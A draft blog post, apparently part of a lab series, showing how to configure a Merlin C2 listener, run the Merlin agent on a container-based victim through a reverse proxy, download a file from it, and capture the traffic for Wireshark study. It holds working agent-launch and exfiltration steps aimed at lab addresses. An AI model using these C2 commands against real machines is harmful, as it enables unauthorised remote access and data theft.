---
title: Scenario number 1.
description: Draft
date: 2021-07-03
scheduled: 2021-07-03
layout: layouts/post.njk
order: 7
tags: posts
---

Let's see how a Remote Access Tool like Merlin communicates! We'll capture and read packets in two scenarios:

    * when the attacker connects straight to the victim,
    * when the attacker connects through our reverse proxy.

First, let's configure the merlin server. Go to the Attacker and open Merlin (remember that you can hit TAB to see all availeable options). Next, type `listeners` and `use http2`. Now we'll configure our HTTPS listener again. Type in `show`. Let's set Interface to our container's IP address, set Port to 5555, and rename it to MerlinListener. Normally you'd change the PSK, the preshared key you use in your first connection to the server, for something stronger but we'll leave it as is.

![merlin http setup](/img/remote/merlin-config.png)

Looks good! Let's start it.

Start up our Reverse Proxy and let's get on to our Victim. You should open two terminals, one for capturing and the other for connecting.
Start up the capture:

``` bash
tcpdump -s 65535 -i any -v -w my_capture.pcap
```

And in the other terminal let's start the agent. The address that we pass leads to our Reverse Proxy that will pass the traffic from and to our Attacker.

``` bash
./merlinAgent-Linux-x64 -url https://172.17.0.4/merlin -psk 'merlin' -v
```

We can already see a couple dozen packages just from the connection. If we wait we can see that each check-in from the agent generates another dozen packages.
Before we get a thousand of idle message packages, let's give our agent something to do. In Merlin type in `interact` and let TAB completion fill out agent ID. Next let's see what files our Victim with `ls`. We can see the `hello.txt` file we put on the Victim earlier. Let's download it back.

![download hello](/img/remote/merlin-job.png)

![agent job](/img/remote/agent-job.png)

Now let's stop the packet capture with `CTRL + C` as well as the agent and Merlin. Let's transfer the capture from the container to our Desktop, like before:

``` bash
docker cp edf2ed59c20d:/my_capture.pcap C:\Users\User\Desktop\my_capture.pcap
```

Open the file with WireShark and let's see what we captured.

![packet capture](/img/remote/packet-capture.png)

This is a whole lot of packets and seemingly unreadable information, and this isn't a tutorial about reading WireShark output, but we can get some snippets of information out of them.





















// one connection http straight to merlin
// one and half doesnt work http through proxy dunno why
// second connection http2 straight to merlin
// third connection http2 through proxy to merlin